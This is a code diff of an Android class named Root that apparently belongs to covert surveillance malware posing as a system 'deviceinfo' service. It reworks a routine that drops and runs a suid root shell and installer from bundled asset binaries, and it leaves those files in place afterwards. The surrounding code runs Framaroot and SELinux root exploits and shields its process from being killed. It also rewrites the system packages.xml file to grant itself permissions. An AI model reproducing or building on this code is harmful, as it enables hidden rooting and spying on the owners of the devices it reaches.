@@ -28,6 +28,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.crypto.Keys;
+import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
@@ -41,7 +42,7 @@ public class Root {
 	public static String method = "";
 	public static Date startExploiting = new Date();
 	private static int askedSu = 0;
-	
+
 	static public boolean isNotificationNeeded() {
 		if (Cfg.OSVERSION.equals("v2") == false) {
 			int sdk_version = android.os.Build.VERSION.SDK_INT;
@@ -60,7 +61,8 @@ public class Root {
 			ret = false;
 		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
-				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
+				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
+																// HONEYCOMB_MR2
 			ret = !checkFramarootExploitability();
 		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
 																										// -
@@ -70,7 +72,7 @@ public class Root {
 			ret = !checkSELinuxExploitability();
 		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
 			ret = true;
-		} 
+		}
 
 		if (ret) {
 			if (Cfg.DEBUG) {
@@ -91,19 +93,20 @@ public class Root {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
 			}
-			
+
 			return;
 		}
 
 		startExploiting = new Date();
-		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) { 
+		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
 			}
 			method = M.e("old");
 			return;
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
-				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO - HONEYCOMB_MR2
+				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
+																// HONEYCOMB_MR2
 			// Framaroot
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
@@ -179,8 +182,8 @@ public class Root {
 		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
 		// /proc/
 		// 32_36=/oom_score_adj\"
-		String script = M.e("#!/system/bin/sh") + "\n" + Configuration.shellFile + M.e(" qzx \"echo '-1000' > /proc/") + pid
-				+ M.e("/oom_score_adj\"") + "\n";
+		String script = M.e("#!/system/bin/sh") + "\n" + Configuration.shellFile + M.e(" qzx \"echo '-1000' > /proc/")
+				+ pid + M.e("/oom_score_adj\"") + "\n";
 		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
 		// 32_38=/oom_adj\"
 		script += Configuration.shellFile + M.e(" qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";
@@ -220,10 +223,10 @@ public class Root {
 
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = M.e("#!/system/bin/sh") + "\n";
-		
+
 		script += Configuration.shellFile + " ru\n";
 		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
-		if(Cfg.DEBUG){
+		if (Cfg.DEBUG) {
 			script += "rm /data/local/tmp/log\n";
 		}
 
@@ -253,59 +256,59 @@ public class Root {
 	}
 
 	// Prendi la root tramite superuser.apk
-	static public void superapkRoot() {
-		final File filesPath = Status.getAppContext().getFilesDir();
-		final String path = filesPath.getAbsolutePath();
-		final String suidext = M.e("statusdb"); // sdb
+	static public void supersuRoot() {
 
 		if (Status.haveSu() == false) {
 			return;
 		}
 
-		// exploit
-		// InputStream stream = resources.openRawResource(R.raw.statuslog);
+		final File filesPath = Status.getAppContext().getFilesDir();
+		// final String path = filesPath.getAbsolutePath();
+		String pack = Status.self().getAppContext().getPackageName();
+		final String installPath = String.format(M.e("/data/data/%s/files"), pack);
 
-		// suidext
-		// s.bin : vecchio rilcap
-		// j.bin : nuovo rilcap
-		InputStream stream = Utils.getAssetStream("s.bin");
+		final AutoFile suidext = new AutoFile(installPath, M.e("ss")); // suidext
+																		// standard
+		final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("qj")); // selinux_suidext
+		final AutoFile shellInstaller = new AutoFile(installPath, M.e("tk")); // shell_installer.sh
 
 		try {
-			fileWrite(suidext, stream, Cfg.RNDDB);
-			String pack = Status.self().getAppContext().getPackageName();
+			// suidext
+			InputStream streamS = Utils.getAssetStream("s.bin");
+			// selinux_suidext
+			InputStream streamJ = Utils.getAssetStream("j.bin");
+			// shell_installer.sh
+			InputStream streamK = Utils.getAssetStream("k.bin");
+
+			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
+			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
+			fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);
+
+			if (Cfg.DEBUG) {
+				Check.asserts(suidext.exists(), " (supersuRoot) Assert failed, not existing: " + suidext);
+				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
+				Check.asserts(shellInstaller.exists(), " (supersuRoot) Assert failed, not existing: " + shellInstaller);
+			}
+
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
-				Check.log(TAG + " (superapkRoot): " + String.format(M.e("su -c /data/data/%s/files/s"), pack)); //$NON-NLS-1$
+				Check.log(TAG + " (supersuRoot): " + "chmod 755 " + suidext + " " + selinuxSuidext
+						+ " " + shellInstaller); //$NON-NLS-1$
+				Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext + " " + suidext); //$NON-NLS-1$
 			}
 
-			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
+			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext + " " + selinuxSuidext + " " + shellInstaller);
 
-			// 32.29 = /data/data/com.android.service/files/statusdb rt
-			// 32_34=#!/system/bin/sh\n
-			String script = M.e("#!/system/bin/sh") + "\n"
-					+ String.format(M.e("/data/data/%s/files/statusdb rt"), pack) + "\n";
+			ExecuteResult res = Execute.execute(new String[] { shellInstaller.getFilename(),
+					selinuxSuidext.getFilename(), suidext.getFilename() });
 
-			if (Root.createScript("s", script) == true) {
-				// 32_7=/system/bin/chmod 755
-				
-				// su -c /data/data/com.android.service/files/s
-				boolean res = Execute.executeWaitFor(String.format(M.e("su -c /data/data/%s/files/s"), pack));
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (superapkRoot) execute 2: "
-							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + res);
-				}
-
-				Root.removeScript("s");
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
-				}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
 			}
 
-			File file = new File(Status.getAppContext().getFilesDir(), suidext);
-			file.delete();
+			// shellInstaller.delete();
+			// suidext.delete();
+			// selinuxSuidext.delete();
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -313,7 +316,7 @@ public class Root {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (superapkRoot): Exception"); //$NON-NLS-1$
+				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
 			}
 
 			return;
@@ -324,8 +327,8 @@ public class Root {
 		final Properties properties = System.getProperties();
 		String version = properties.getProperty(M.e("os.version"));
 		final PackageManager pm = Status.getAppContext().getPackageManager();
-		
-		if (version.contains("cyanogenmod") || version.contains("-CM-") 
+
+		if (version.contains("cyanogenmod") || version.contains("-CM-")
 				|| pm.hasSystemFeature("com.cyanogenmod.account") || pm.hasSystemFeature("com.cyanogenmod.updater")) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (checkFramarootExploitability) cyanogenmod");
@@ -341,14 +344,14 @@ public class Root {
 		final String path = filesPath.getAbsolutePath();
 		final String exploitCheck = M.e("ec"); // ec
 
-		if(checkCyanogenmod()){
+		if (checkCyanogenmod()) {
 			return false;
 		}
-		
-		if ((android.os.Build.VERSION.SDK_INT < 14 || android.os.Build.VERSION.SDK_INT > 17)){
+
+		if ((android.os.Build.VERSION.SDK_INT < 14 || android.os.Build.VERSION.SDK_INT > 17)) {
 			return false;
 		}
-		
+		// preprocess/expl_check
 		InputStream stream = Utils.getAssetStream("h.bin");
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkFramarootExploitability) ");
@@ -389,13 +392,15 @@ public class Root {
 		final String path = filesPath.getAbsolutePath();
 		final String exploitCheck = M.e("ecs"); // ecs
 
-		if(checkCyanogenmod()){
+		if (checkCyanogenmod()) {
 			return false;
 		}
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkSELinuxExploitability) ");
 		}
+
+		// preprocess/selinux_check
 		InputStream stream = Utils.getAssetStream("d.bin");
 
 		try {
@@ -431,8 +436,8 @@ public class Root {
 	static public boolean framarootExploit() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
-		final String localExploit = M.e("l"); // local_exploit
-		// l
+		final String localExploit = M.e("l");
+		// preprocess/local_exploit
 		InputStream stream = Utils.getAssetStream("l.bin");
 
 		try {
@@ -442,6 +447,7 @@ public class Root {
 
 			// Unpack the suid shell
 			final String suidShell = M.e("ss"); // suid shell
+			// preprocess/suidext
 			InputStream shellStream = Utils.getAssetStream("s.bin");
 
 			fileWrite(suidShell, shellStream, Cfg.RNDDB);
@@ -572,28 +578,28 @@ public class Root {
 		}
 
 		boolean ask = false;
-		
+
 		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
-			if( checkCyanogenmod() ){
-				if (Cfg.SUPPORT_CYANOGENMOD) {
-					ask = true;
-				}
+			if (checkCyanogenmod()) {
+				// if (Cfg.SUPPORT_CYANOGENMOD) {
+				ask = true;
+				// }
 			} else {
 				boolean frama = checkFramarootExploitability();
 				boolean se = checkSELinuxExploitability();
-				ask = !( frama || se);
+				ask = !(frama || se);
 			}
 		}
 
-		if (ask && askedSu < Cfg.MAX_ASKED_SU ) {
-			askedSu  += 1;
-			
+		if (ask && askedSu < Cfg.MAX_ASKED_SU) {
+			askedSu += 1;
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), ask the user");
 			}
-			 
+
 			// Ask the user...
-			Root.superapkRoot();
+			Root.supersuRoot();
 
 			// Cyanogen should disable the superuser notification
 			Status.setRoot(PackageInfo.checkRoot());
@@ -604,14 +610,14 @@ public class Root {
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPermissions), don't ask");
-			}	
+			}
 		}
 
 		if (Status.haveRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
 			}
-		}else{
+		} else {
 			Configuration.shellFile = Configuration.shellFileBase;
 		}
 
@@ -714,12 +720,13 @@ public class Root {
 			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
 			// /system/bin/ntpsvd fhc /data/system/packages.xml
 			// /data/data/com.android.service/files/packages.xml
-			Execute.execute(String.format(
-					M.e("%s fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), Configuration.shellFile , pack));
+			Execute.execute(String.format(M.e("%s fhc /data/system/packages.xml /data/data/%s/files/packages.xml"),
+					Configuration.shellFile, pack));
 			Utils.sleep(600);
 			// /system/bin/ntpsvd pzm 666
 			// /data/data/com.android.service/files/packages.xml
-			Execute.execute(String.format(M.e("%s pzm 666 /data/data/%s/files/packages.xml"), Configuration.shellFile, pack));
+			Execute.execute(String.format(M.e("%s pzm 666 /data/data/%s/files/packages.xml"), Configuration.shellFile,
+					pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
@@ -772,15 +779,15 @@ public class Root {
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
 			// /data/data/com.android.service/files/layout >
-			Execute.execute(String.format(M.e("%s qzx \"cat /data/data/%s/files/layout > "), Configuration.shellFile, pack)
-					+ path + "\"");
+			Execute.execute(String.format(M.e("%s qzx \"cat /data/data/%s/files/layout > "), Configuration.shellFile,
+					pack) + path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
 			// /system/bin/ntpsvd qzx
 			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
 			Execute.execute(String.format(
-					M.e("%s qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""), Configuration.shellFile,
-					pack));
+					M.e("%s qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),
+					Configuration.shellFile, pack));
 
 			// Rimuoviamo la nostra copia
 			// /data/data/com.android.service/files/packages.xml
@@ -825,45 +832,6 @@ public class Root {
 		return 1;
 	}
 
-	static public void runGingerBreak() {
-		boolean isRoot = Status.haveRoot();
-
-		if (isRoot == false) {
-			// Don't exploit if we have no SD card mounted
-			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
-				// isRoot = root();
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
-				}
-			}
-		}
-
-		if (isRoot == false) {
-			// Ask the user...
-			Root.superapkRoot();
-
-			isRoot = PackageInfo.checkRoot();
-		}
-
-		if (isRoot == true) {
-			int ret = Root.overridePermissions();
-
-			Toast.makeText(Status.getAppContext(), "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-
-			switch (ret) {
-			case 0:
-			case 1:
-				return; // Non possiamo partire
-
-			case 2: // Possiamo partire
-			default:
-				break;
-			}
-		}
-
-		Status.setRoot(isRoot);
-	}
 }
 
 class selinuxExploitThread implements Runnable {
@@ -878,8 +846,11 @@ class selinuxExploitThread implements Runnable {
 		final String suidext = M.e("ss"); // suidext (standard)
 
 		InputStream streamExpl = Utils.getAssetStream("g.bin"); // selinux_exploit
-		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext rilcap
-		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext rilcapn (standard)
+		InputStream streamSelinuxSuidext = Utils.getAssetStream("j.bin"); // selinux_suidext
+																			// rilcap
+		InputStream streamSuidext = Utils.getAssetStream("s.bin"); // suidext
+																	// rilcapn
+																	// (standard)
 
 		try {
 			Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
@@ -933,9 +904,9 @@ class selinuxExploitThread implements Runnable {
 							Check.log(TAG + "(run): exploitation terminated after "
 									+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
 						}
-						if(PackageInfo.checkRoot()){
+						if (PackageInfo.checkRoot()) {
 							Status.setRoot(true);
-					
+
 							Status.self().setReload();
 						}
 						break;
